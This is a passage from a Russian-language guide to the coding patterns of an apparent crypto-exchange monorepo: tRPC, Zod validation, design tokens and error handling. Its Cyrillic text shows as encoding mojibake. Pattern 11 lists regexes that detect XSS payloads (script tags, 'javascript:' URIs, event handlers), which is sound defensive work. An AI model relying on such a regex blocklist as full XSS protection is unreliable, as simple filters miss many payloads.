// ‚ùå –ë–µ–∑ tRPC - –æ—à–∏–±–∫–∏ —Ç–æ–ª—å–∫–æ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
const response = await fetch('/api/orders');
const orders = await response.json();
orders.forEach(order => {
  console.log(order.orderId); // –ú–æ–∂–µ—Ç –Ω–µ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å!
  console.log(order.amount.toFixed(2)); // amount –º–æ–∂–µ—Ç –±—ã—Ç—å string!
});

// ‚úÖ –° tRPC - –æ—à–∏–±–∫–∏ –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏
const { data: orders } = api.exchange.getUserOrders.useQuery();
orders?.orders.forEach(order => {
  console.log(order.orderId); // ‚úÖ –ì–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ string
  console.log(order.fromAmount.toFixed(2)); // ‚úÖ –ì–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ number
});
```

**2. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è:**

```typescript
// –ö–ª–∏–µ–Ω—Ç –Ω–µ –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
createOrder.mutate({
  amount: -100, // ‚ùå –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–æ
  fromCurrency: 'XYZ', // ‚ùå –ù–µ –≤ —Å–ø–∏—Å–∫–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã—Ö
  toWallet: 'invalid', // ‚ùå –ù–µ –ø—Ä–æ—à–ª–æ –≤–∞–ª–∏–¥–∞—Ü–∏—é –∞–¥—Ä–µ—Å–∞
});

// –û—à–∏–±–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ—Å—Ç—É–ø–Ω—ã –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
if (error?.data?.zodError) {
  const amountError = error.data.zodError.fieldErrors.amount?.[0];
  // "–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π"
}
```

**3. –ê–≤—Ç–æ-–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è API:**

```typescript
// tRPC –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é
// –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –≤–∏–¥—è—Ç –≤—Å–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –º–µ—Ç–æ–¥—ã —Å —Ç–∏–ø–∞–º–∏
api.exchange.createOrder     // –°–æ–∑–¥–∞—Ç—å –∑–∞–∫–∞–∑
api.exchange.getUserOrders   // –ü–æ–ª—É—á–∏—Ç—å –∑–∞–∫–∞–∑—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
api.exchange.getOrderStatus  // –°—Ç–∞—Ç—É—Å –∑–∞–∫–∞–∑–∞

// IDE –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—ã–µ —Ç–∏–ø—ã
createOrder.mutate({
  // IntelliSense –ø–æ–∫–∞–∂–µ—Ç –≤—Å–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –ø–æ–ª—è
  fromCurrency: // –ê–≤—Ç–æ–¥–æ–ø–æ–ª–Ω–µ–Ω–∏–µ: 'BTC' | 'ETH' | 'USDT'
});
```

#### ‚ö†Ô∏è **–ß–¢–û –ü–†–û–ò–°–•–û–î–ò–¢ –ë–ï–ó tRPC**

**–ü—Ä–æ–±–ª–µ–º–∞ ‚Ññ1: Runtime –æ—à–∏–±–∫–∏ –∏–∑-–∑–∞ –Ω–µ—Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏—è —Ç–∏–ø–æ–≤**

```typescript
// ‚ùå REST API - –æ—à–∏–±–∫–∞ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—Å—è —Ç–æ–ª—å–∫–æ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
// –°–µ—Ä–≤–µ—Ä –∏–∑–º–µ–Ω–∏–ª –ø–æ–ª–µ orderId –Ω–∞ orderNumber
const response = await fetch('/api/order/123');
const order = await response.json();
console.log(order.orderId); // undefined! –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å–ª–æ–º–∞–Ω–æ

// –° tRPC —Ç–∞–∫–æ–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ - TypeScript —Å—Ä–∞–∑—É –ø–æ–∫–∞–∂–µ—Ç –æ—à–∏–±–∫—É
```

**–ü—Ä–æ–±–ª–µ–º–∞ ‚Ññ2: –î—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏**

```typescript
// ‚ùå –ë–µ–∑ tRPC - –≤–∞–ª–∏–¥–∞—Ü–∏—è –¥—É–±–ª–∏—Ä—É–µ—Ç—Å—è
// –ù–∞ –∫–ª–∏–µ–Ω—Ç–µ:
if (!amount || amount <= 0) {
  return '–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π';
}

// –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ:
if (!req.body.amount || req.body.amount <= 0) {
  return res.status(400).json({ error: '–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π' });
}

// –° tRPC - –æ–¥–Ω–∞ —Å—Ö–µ–º–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞ –∏ —Å–µ—Ä–≤–µ—Ä–∞
```

#### üõ†Ô∏è **–ö–û–ì–î–ê AI –°–û–ó–î–ê–ï–¢ tRPC –ü–†–û–¶–ï–î–£–†–´**

**–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —Ç—Ä–∏–≥–≥–µ—Ä—ã:**

- –õ—é–±–æ–π –Ω–æ–≤—ã–π API endpoint –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è tRPC –ø—Ä–æ—Ü–µ–¥—É—Ä–æ–π
- –§–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ –ø–æ–ª—É—á–∞—é—Ç –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –≤–∞–ª–∏–¥–∞—Ü–∏—é
- CRUD –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å–æ–∑–¥–∞—é—Ç—Å—è —Å –ø–æ–ª–Ω—ã–º –Ω–∞–±–æ—Ä–æ–º –ø—Ä–æ—Ü–µ–¥—É—Ä

**–®–∞–±–ª–æ–Ω—ã –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ API:**

```typescript
// –§–∏–Ω–∞–Ω—Å–æ–≤—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ - –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞
const financialProcedure = protectedProcedure
  .use(securityEnhanced)
  .use(rateLimited)
  .use(auditLogged);

// –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ - –æ–±—ã—á–Ω–∞—è –∑–∞—â–∏—Ç–∞
const userProcedure = protectedProcedure.use(rateLimited);

// –ü—É–±–ª–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ - –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞
const publicProcedure = t.procedure.use(cached);
```

**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**:

- `apps/web/src/server/trpc/routers/exchange.ts` - –æ–±–º–µ–Ω –≤–∞–ª—é—Ç
- `apps/web/src/server/trpc/routers/user.ts` - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ
- `apps/web/src/server/trpc/routers/public.ts` - –ø—É–±–ª–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** API –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω–æ, –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞–Ω–æ –∏ –¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–æ. –û—à–∏–±–∫–∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—é—Ç—Å—è –Ω–∞ —ç—Ç–∞–ø–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, –∞ –Ω–µ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.

---

### üé® **–ü–∞—Ç—Ç–µ—Ä–Ω 5: Design Tokens + Variants (–î–∏–∑–∞–π–Ω-—Ç–æ–∫–µ–Ω—ã)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ —Å—Ç–∏–ª–∏ –ø—Ä–æ–µ–∫—Ç–∞ (`packages/design-tokens/`, `packages/ui/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –ø–∞–ª–∏—Ç—Ä–∞ –∫—Ä–∞—Å–æ–∫ —Ö—É–¥–æ–∂–Ω–∏–∫–∞ - –∑–∞—Ä–∞–Ω–µ–µ –∑–∞–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–µ —Ü–≤–µ—Ç–∞ –∏ —Ä–∞–∑–º–µ—Ä—ã

```typescript
// –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–µ —Å—Ç–∏–ª–∏ —Å –≤–∞—Ä–∏–∞–Ω—Ç–∞–º–∏
const buttonVariants = cva('base-button-styles', {
  variants: {
    variant: {
      primary: 'bg-primary text-primary-foreground',
      secondary: 'bg-secondary text-secondary-foreground',
    },
    size: {
      sm: 'h-8 px-3',
      lg: 'h-12 px-8',
    },
  },
});
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ —Ç–æ–∫–µ–Ω—ã –≤–º–µ—Å—Ç–æ —Å–æ–∑–¥–∞–Ω–∏—è CSS —Å –Ω—É–ª—è
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `packages/design-tokens/index.js`, `packages/ui/src/components/ui/`

---

### üîß **–ü–∞—Ç—Ç–µ—Ä–Ω 6: Validation Helpers (–ü–æ–º–æ—â–Ω–∏–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –£–ø—Ä–æ—â–µ–Ω–∏–µ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ (`packages/utils/src/validation/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –≥–æ—Ç–æ–≤—ã–µ —à—Ç–∞–º–ø—ã –≤ –æ—Ñ–∏—Å–µ - –±—ã—Å—Ç—Ä–æ –∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ

```typescript
// –í–º–µ—Å—Ç–æ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏—è safeParse –ª–æ–≥–∏–∫–∏
const result = validateWithResult(schema, data);
if (!result.success) {
  return { error: result.error };
}
// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ –∏ —Ç–∏–ø–∏–∑–∞—Ü–∏—è
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –ò—Å–ø–æ–ª—å–∑—É–µ—Ç helpers –≤–º–µ—Å—Ç–æ –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ª–æ–≥–∏–∫–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `validation-helpers.ts`, `zod-helpers.ts`

---

### üåê **–ü–∞—Ç—Ç–µ—Ä–Ω 7: Centralized Error Handling (–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ API –æ—à–∏–±–∫–∏ (`packages/utils/src/trpc-errors.ts`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –µ–¥–∏–Ω–∞—è —Å–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ - –≤—Å–µ –æ—à–∏–±–∫–∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç—Å—è –æ–¥–∏–Ω–∞–∫–æ–≤–æ

```typescript
// –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–µ —Ç–∏–ø—ã –æ—à–∏–±–æ–∫
export const createOrderError = (message: string) =>
  createTRPCError('BAD_REQUEST', `Order creation failed: ${message}`);

// –í–º–µ—Å—Ç–æ —Ä–∞–∑–Ω—ã—Ö —Ñ–æ—Ä–º–∞—Ç–æ–≤ –æ—à–∏–±–æ–∫ –≤–µ–∑–¥–µ
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—à–∏–±–æ–∫ –¥–ª—è –∫–æ–Ω—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `trpc-errors.ts`

---

### üì¶ **–ü–∞—Ç—Ç–µ—Ä–Ω 8: Enhanced Building Blocks (–£–ª—É—á—à–µ–Ω–Ω—ã–µ –±–ª–æ–∫–∏)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –≤–∞–ª–∏–¥–∞—Ü–∏–æ–Ω–Ω—ã–µ –±–ª–æ–∫–∏ (`packages/utils/src/validation/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –º–æ–¥—É–ª–∏ –≤ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–µ - —Å–æ–±–∏—Ä–∞–µ—à—å —Å–ª–æ–∂–Ω–æ–µ –∏–∑ –ø—Ä–æ—Å—Ç—ã—Ö –±–ª–æ–∫–æ–≤

```typescript
// –ì–æ—Ç–æ–≤—ã–µ –±–ª–æ–∫–∏ —Å XSS –∑–∞—â–∏—Ç–æ–π
export const createXSSProtectedStringWithLength = (minLength: number, maxLength: number) =>
  z
    .string()
    .min(minLength)
    .max(maxLength)
    .refine(val => !containsPotentialXSS(val), 'XSS_DETECTED');
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –°–æ–±–∏—Ä–∞–µ—Ç —Å–ª–æ–∂–Ω—É—é –≤–∞–ª–∏–¥–∞—Ü–∏—é –∏–∑ –≥–æ—Ç–æ–≤—ã—Ö –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö –±–ª–æ–∫–æ–≤
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `enhanced-building-blocks.ts`

---

### üéØ **–ü–∞—Ç—Ç–µ—Ä–Ω 9: Responsive Adaptive Container (–ê–¥–∞–ø—Ç–∏–≤–Ω—ã–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ layout –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã (`packages/ui/src/components/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ —Ä–µ–∑–∏–Ω–æ–≤–∞—è —Ñ–æ—Ä–º–∞ - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–¥—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç—Å—è –ø–æ–¥ —Ä–∞–∑–º–µ—Ä —ç–∫—Ä–∞–Ω–∞

```typescript
// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∞–¥–∞–ø—Ç–∞—Ü–∏—è –ø–æ–¥ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
<AdaptiveContainer>
  <AdaptiveContainer.Mobile>–ú–æ–±–∏–ª—å–Ω–∞—è –≤–µ—Ä—Å–∏—è</AdaptiveContainer.Mobile>
  <AdaptiveContainer.Desktop>–î–µ—Å–∫—Ç–æ–ø–Ω–∞—è –≤–µ—Ä—Å–∏—è</AdaptiveContainer.Desktop>
</AdaptiveContainer>
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –°–æ–∑–¥–∞–µ—Ç –∞–¥–∞–ø—Ç–∏–≤–Ω—ã–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã –±–µ–∑ –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–¥–∞
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `adaptive-container.tsx`, `page-layout.tsx`

---

### üîç **–ü–∞—Ç—Ç–µ—Ä–Ω 10: File Pattern Configuration (–ö–æ–Ω—Ñ–∏–≥—É—Ä–∏—Ä—É–µ–º—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –ø–æ–∏—Å–∫–∞)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ (`packages/style-scanner/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–æ–∏—Å–∫–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã - –∑–Ω–∞–µ—Ç –≥–¥–µ –∏—Å–∫–∞—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —Ç–∏–ø—ã —Ñ–∞–π–ª–æ–≤

```typescript
// –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –≤–º–µ—Å—Ç–æ hardcode
export const DEFAULT_PROJECT_STRUCTURE = {
  apps: {
    pagePatterns: ['apps/*/app/**/page.{tsx,jsx}'],
    layoutPatterns: ['apps/*/app/**/layout.{tsx,jsx}'],
    componentPatterns: ['apps/*/src/components/**/*.{tsx,jsx}'],
  },
};
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∏—Ä—É–µ–º—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –ø—Ä–æ–µ–∫—Ç–∞
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `packages/style-scanner/src/config/default-patterns.ts`

---

### üîê **–ü–∞—Ç—Ç–µ—Ä–Ω 11: Security Patterns (–®–∞–±–ª–æ–Ω—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –ó–∞—â–∏—Ç–∞ –æ—Ç XSS –∞—Ç–∞–∫ (`packages/utils/src/validation/security-utils.ts`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞—Ö–æ–¥–∏—Ç –∏ –±–ª–æ–∫–∏—Ä—É–µ—Ç –æ–ø–∞—Å–Ω—ã–π –∫–æ–¥

```typescript
// –ì–æ—Ç–æ–≤—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∞—Ç–∞–∫
const XSS_PATTERNS = [
  /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
  /javascript:/gi,
  /on\w+\s*=/gi,
];

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤—Å–µ—Ö —Å—Ç—Ä–æ–∫
const isClean = !containsPotentialXSS(userInput);
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏–º–µ–Ω—è–µ—Ç XSS –∑–∞—â–∏—Ç—É –∫–æ –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –¥–∞–Ω–Ω—ã–º
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `security-utils.ts`, –≤—Å–µ security-enhanced —Å—Ö–µ–º—ã

---

### üè∑Ô∏è **–ü–∞—Ç—Ç–µ—Ä–Ω 12: Constants Centralization (–¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–∞—Ü–∏—è –∫–æ–Ω—Å—Ç–∞–Ω—Ç)**

**–ì–¥–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è**: –í—Å–µ —á–∏—Å–ª–æ–≤—ã–µ –∏ —Å—Ç—Ä–æ–∫–æ–≤—ã–µ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã (`packages/constants/`)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –≥–ª–∞–≤–Ω–∞—è –±–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö —Å–ø—Ä–∞–≤–æ—á–Ω–∏–∫–æ–≤ - –æ–¥–Ω–æ –º–µ—Å—Ç–æ, –≤—Å–µ –∏—Å—Ç–æ—á–Ω–∏–∫–∏

```typescript
// –ï–¥–∏–Ω—ã–π –∏—Å—Ç–æ—á–Ω–∏–∫ –∏—Å—Ç–∏–Ω—ã
export const VALIDATION_LIMITS = {
  MIN_USERNAME_LENGTH: 3,
  MAX_USERNAME_LENGTH: 50,
  ORDER_TIMEOUT_MS: 900000,
};

// –í–º–µ—Å—Ç–æ –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–∏—Ñ—Ä –ø–æ –≤—Å–µ–º—É –ø—Ä–æ–µ–∫—Ç—É
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç AI**: –í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã –∏–∑ `@repo/constants` –≤–º–µ—Å—Ç–æ hardcode
**–§–∞–π–ª—ã –ø—Ä–∏–º–µ—Ä—ã**: `packages/constants/src/`

---

## ÔøΩüí° **–ó–ê–ö–õ–Æ–ß–ï–ù–ò–ï**

–≠—Ç–æ—Ç –ø—Ä–æ–µ–∫—Ç –ø–æ—Å—Ç—Ä–æ–µ–Ω –∫–∞–∫ **—Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –º–æ–Ω–æ—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π** —Å **—Å—Ç—Ä–æ–≥–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–æ–π** –∏ **12 –∫–ª—é—á–µ–≤—ã–º–∏ –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º–∏**.

**–ì–ª–∞–≤–Ω–∞—è –∏–¥–µ—è**: –≤–º–µ—Å—Ç–æ –Ω–∞–ø–∏—Å–∞–Ω–∏—è –∫–æ–¥–∞ —Å –Ω—É–ª—è, AI –∞–≥–µ–Ω—Ç **–∫–æ–º–±–∏–Ω–∏—Ä—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã** –∫–∞–∫ –∏–∑ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–∞ LEGO. –≠—Ç–æ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç:

‚úÖ **–°–∫–æ—Ä–æ—Å—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏** - –Ω–µ –Ω—É–∂–Ω–æ –∏–∑–æ–±—Ä–µ—Ç–∞—Ç—å –≤–µ–ª–æ—Å–∏–ø–µ–¥
‚úÖ **–ö–∞—á–µ—Å—Ç–≤–æ** - –≥–æ—Ç–æ–≤—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã —É–∂–µ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω—ã  
‚úÖ **–ö–æ–Ω—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç—å** - –≤—Å–µ –≤—ã–≥–ª—è–¥–∏—Ç –æ–¥–∏–Ω–∞–∫–æ–≤–æ
‚úÖ **–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å** - –∑–∞—â–∏—Ç–∞ –æ—Ç XSS –∞—Ç–∞–∫ –≤—Å—Ç—Ä–æ–µ–Ω–∞
‚úÖ **–ú–∞—Å—à—Ç–∞–±–∏—Ä—É–µ–º–æ—Å—Ç—å** - –ª–µ–≥–∫–æ –¥–æ–±–∞–≤–ª—è—Ç—å –Ω–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏

**–í–∞—à–∞ —Ä–æ–ª—å**: –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ –∏ –∑–∞–¥–∞–≤–∞—Ç—å –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–∞–∑–≤–∏—Ç–∏—è.
**–†–æ–ª—å AI**: —Ä–µ–∞–ª–∏–∑–æ–≤—ã–≤–∞—Ç—å —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é —á–∞—Å—Ç—å, —Å–ª–µ–¥—É—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–Ω—ã–º –ø—Ä–∏–Ω—Ü–∏–ø–∞–º –∏ –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º.

---

_–°–æ–∑–¥–∞–Ω–æ: 31 –∞–≤–≥—É—Å—Ç–∞ 2025_  
_–í–µ—Ä—Å–∏—è: 1.0_
